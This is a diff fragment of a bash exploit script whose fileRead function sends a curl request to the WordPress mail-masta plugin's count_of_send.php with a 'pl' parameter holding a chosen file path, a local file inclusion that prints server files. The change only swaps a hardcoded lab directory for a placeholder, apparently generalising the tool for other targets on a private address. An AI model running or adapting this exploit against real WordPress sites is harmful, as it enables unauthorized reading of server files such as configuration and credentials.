@@ -15,7 +15,7 @@ function fileRead(){
   filename=$1
 
   echo -e "\n[+] This is the content of the file $filename:\n"
-  curl -s -X GET "http://192.168.129.128/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$filename"
+  curl -s -X GET "http://192.168.129.128/WORDPRESSDIRECTORY/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$filename"
 }
 
 function helpPanel(){
